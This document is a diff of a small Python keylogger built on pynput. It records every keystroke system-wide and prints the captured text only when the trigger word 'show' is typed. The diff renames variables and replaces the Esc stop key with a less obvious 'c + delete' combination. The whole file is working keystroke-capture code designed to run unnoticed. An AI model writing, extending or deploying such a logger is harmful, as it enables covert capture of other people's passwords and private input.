@@ -1,23 +1,24 @@
 from pynput import keyboard
-save = []
+input_keys = []
 def on_press(key):
     try:
-        save.append(key.char)
+        input_keys.append(key.char)
     except:
-        save.append(str(key))
+        input_keys.append(str(key))
 
 ###     stop monitoring     ###
 def on_release(key):
     try:
-        show = save[-1] == 'w' and save[-2] == 'o' and save[-3] == 'h' and save[-4] == 's'
+        show = input_keys[-1] == 'w' and input_keys[-2] == 'o' and input_keys[-3] == 'h' and input_keys[-4] == 's'
         if show:
-            save.pop()
-            save.pop()
-            save.pop()
-            save.pop()
-            save2 = "".join(save)
-            print(save2)
-        elif key == keyboard.Key.esc:
+            input_keys.pop()
+            input_keys.pop()
+            input_keys.pop()
+            input_keys.pop()
+            output_text = "".join(input_keys)
+            print(output_text)
+        ###     pree "c + delete" to stop monitoring       ###
+        elif key == keyboard.Key.delete and input_keys[-2] == 'c':
             return False
         else:
             pass
@@ -27,5 +28,3 @@ def on_release(key):
 ###     Collect events until released      ###
 with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
     listener.join()
-save2 = "".join(save)
-
